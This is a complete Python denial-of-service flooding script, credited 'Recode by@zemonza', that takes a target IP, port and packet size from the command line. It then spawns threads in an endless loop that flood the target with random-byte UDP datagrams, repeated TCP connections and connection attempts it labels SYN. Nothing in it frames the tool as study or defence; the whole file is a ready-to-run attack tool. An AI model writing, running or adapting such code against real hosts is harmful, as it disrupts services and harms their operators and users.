import threading, sys, time, random, socket

if len(sys.argv) < 4:
    print("Recode by@zemonza")
    sys.exit("Usage: python " + sys.argv[0] + " <ip> <port> <size>")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])

class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except Exception as e:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                self.tcp.connect((self.ip, self.port))
                self.tcp.setblocking(0)
                self.tcp.sendto(bytes, (self.ip, self.port))
            except Exception as e:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes, (self.ip, self.port))
            except Exception as e:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        u = udp(ip, port, size, packets)
        t = tcp(ip, port, size, packets)
        s = syn(ip, port, packets)
        u.start()
        t.start()
        s.start()
    except KeyboardInterrupt:
        print("Stopping Flood!")
        sys.exit()
    except socket.error as e:
        print("Socket Couldn't Connect")
        sys.exit()